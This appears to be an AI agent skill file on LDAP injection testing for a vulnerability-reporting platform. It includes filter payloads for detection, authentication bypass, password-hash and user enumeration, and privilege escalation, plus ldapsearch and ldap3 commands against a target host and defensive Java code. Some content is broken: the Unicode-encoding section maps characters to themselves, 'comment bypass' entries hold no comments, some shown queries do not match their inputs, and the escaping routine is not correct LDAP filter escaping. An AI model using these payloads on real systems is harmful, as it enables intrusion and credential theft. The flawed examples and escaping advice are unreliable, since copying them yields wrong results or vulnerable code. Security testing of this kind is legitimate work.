---
name: ldap-injection-testing
description: Specialized skill and methodology for LDAP injection vulnerability testing
version: 1.0.0
---

# LDAP Injection Vulnerability Testing

## Overview

LDAP injection is a vulnerability similar to SQL injection that exploits flaws in how LDAP query statements are constructed, potentially leading to information disclosure, authorization bypass, and more. This skill provides methods for detecting, exploiting, and defending against LDAP injection.

## Vulnerability Principle

The application concatenates user input directly into an LDAP query statement without sufficient validation and filtering, allowing an attacker to modify the query logic.

**Dangerous code example:**
```java
String filter = "(&(cn=" + userInput + ")(userPassword=" + password + "))";
ldapContext.search(baseDN, filter, ...);
```

## LDAP Basics

### Query Syntax

**Basic queries:**
```
(cn=John)
(objectClass=person)
(&(cn=John)(mail=john@example.com))
(|(cn=John)(cn=Jane))
(!(cn=John))
```

### Special Characters

**Characters that require escaping:**
- `(` `)` - parentheses
- `*` - wildcard
- `\` - escape character
- `/` - path separator
- `NUL` - null character

## Testing Methodology

### 1. Identify LDAP Input Points

**Common features:**
- User login
- User search
- Directory browsing
- Permission verification

### 2. Basic Detection

**Test special characters:**
```
*)(&
*)(|
*))(
*))%00
```

**Test logical operators:**
```
*)(&(cn=*
*)(|(cn=*
*))(!(cn=*
```

### 3. Authentication Bypass

**Basic bypass:**
```
Username: *)(&
Password: *
Query: (&(cn=*)(&)(userPassword=*))
```

**More precise bypass:**
```
Username: admin)(&(cn=admin
Password: *))
Query: (&(cn=admin)(&(cn=admin)(userPassword=*)))
```

### 4. Information Disclosure

**Enumerate users:**
```
*)(cn=*
*)(uid=*
*)(mail=*
```

**Retrieve attributes:**
```
*)(|(cn=*)(userPassword=*
*)(|(objectClass=*)(cn=*
```

## Exploitation Techniques

### Authentication Bypass

**Method 1: logic bypass**
```
Input: *)(&
Query: (&(cn=*)(&)(userPassword=*))
Result: matches all users
```

**Method 2: comment bypass**
```
Input: admin)(&(cn=admin
Query: (&(cn=admin)(&(cn=admin)(userPassword=*)))
```

**Method 3: wildcard**
```
Input: *)(|(cn=*)(userPassword=*
Query: (&(cn=*)(|(cn=*)(userPassword=*)(userPassword=*))
```

### Information Disclosure

**Enumerate all users:**
```
Search: *)(cn=*
Result: returns all cn attributes
```

**Retrieve password hashes:**
```
Search: *)(|(cn=*)(userPassword=*
Result: returns users and password hashes
```

**Retrieve sensitive attributes:**
```
Search: *)(|(cn=*)(mail=*)(telephoneNumber=*
Result: returns multiple sensitive attributes
```

### Privilege Escalation

**Modify the query logic:**
```
Original: (&(cn=user)(memberOf=CN=Users,DC=example,DC=com))
Injection: user)(memberOf=CN=Admins,DC=example,DC=com))(|(cn=user
Result: may bypass the permission check
```

## Bypass Techniques

### Encoding Bypass

**URL encoding:**
```
*)(& → %2A%29%28%26
*)(| → %2A%29%28%7C
```

**Unicode encoding:**
```
* → *
( → (
) → )
```

### Comment Bypass

**Use comments:**
```
*)(&(cn=*
*)(|(cn=*
```

### Null Byte Injection

**Use a NULL byte:**
```
*))%00
```

## Tool Usage

### JXplorer

**Graphical LDAP client:**
- Connect to the LDAP server
- Browse the directory structure
- Run query tests

### ldapsearch

```bash
# Basic query
ldapsearch -x -H ldap://target.com -b "dc=example,dc=com" "(cn=*)"

# Test injection
ldapsearch -x -H ldap://target.com -b "dc=example,dc=com" "(cn=*)(&"
```

### Burp Suite

1. Intercept the LDAP query request
2. Modify the query parameters
3. Observe the response

### Python Script

```python
import ldap3

server = ldap3.Server('ldap://target.com')
conn = ldap3.Connection(server, authentication=ldap3.SIMPLE,
                        user='cn=admin,dc=example,dc=com',
                        password='password')

# Test injection
filter_str = '*)(&'
conn.search('dc=example,dc=com', filter_str)
print(conn.entries)
```

## Validation and Reporting

### Validation Steps

1. Confirm you can control the LDAP query
2. Verify authentication bypass or information disclosure
3. Assess the impact (unauthorized access, data leakage, etc.)
4. Document a complete PoC
5. Record the confirmed vulnerability in the platform through the `report_finding` tool (the only entry point for logging vulnerabilities on this platform), with fields covering location, type, severity, reproduction steps/PoC, and remediation advice

### Key Reporting Points

- Vulnerability location and input parameter
- How the LDAP query is constructed
- Complete exploitation steps and PoC
- Remediation advice (input validation, parameterized queries, etc.)

## Defensive Measures

### Recommended Solutions

1. **Input validation**
   ```java
   private static final String[] LDAP_ESCAPE_CHARS = 
       {"\\", "*", "(", ")", "\0", "/"};
   
   public static String escapeLDAP(String input) {
       if (input == null) {
         return null;
       }
       StringBuilder sb = new StringBuilder();
       for (int i = 0; i < input.length(); i++) {
         char c = input.charAt(i);
         if (Arrays.asList(LDAP_ESCAPE_CHARS).contains(String.valueOf(c))) {
           sb.append("\\");
         }
         sb.append(c);
       }
       return sb.toString();
   }
   ```

2. **Parameterized queries**
   ```java
   // Use the LDAP API's parameterization feature
   String filter = "(&(cn={0})(userPassword={1}))";
   Object[] args = {escapedCN, escapedPassword};
   // Build the query using the API
   ```

3. **Whitelist validation**
   ```java
   // Allow only specific characters
   if (!input.matches("^[a-zA-Z0-9@._-]+$")) {
       throw new IllegalArgumentException("Invalid input");
   }
   ```

4. **Least privilege**
   - Use a least-privilege account for the LDAP connection
   - Restrict which attributes can be queried
   - Use access control lists

5. **Error handling**
   - Do not return detailed error messages
   - Use a uniform error response
   - Log errors

## Notes

- Only perform this in an authorized test environment
- Be aware of syntax differences across LDAP servers
- Avoid impacting the directory during testing
- Understand the configuration of the target LDAP server
